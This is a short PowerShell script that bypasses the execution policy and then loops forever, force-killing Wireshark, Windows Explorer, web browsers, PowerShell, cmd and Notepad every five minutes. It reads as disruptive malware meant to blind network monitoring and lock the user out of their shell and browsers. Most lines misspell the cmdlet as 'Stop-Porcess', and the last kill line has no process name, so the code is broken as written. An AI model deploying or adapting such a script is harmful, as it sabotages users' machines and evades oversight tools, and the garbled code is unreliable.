set-executionpolicy -Scope CurrentUser bypass
while($true)
{
    Stop-Process -Force -Name Wireshark
    Stop-Porcess -Force -Name explorer
    Stop-Porcess -Force -Name MicrosoftEdge
    Stop-Porcess -Force -Name Chrome
    Stop-Porcess -Force -Name Firefox
    Stop-Porcess -Force -Name powershell
    Stop-Porcess -Force -Name cmd
    Stop-Porcess -Force -Name notepad
    Stop-Porcess -Force -Name 
    Start-Sleep -s 300
}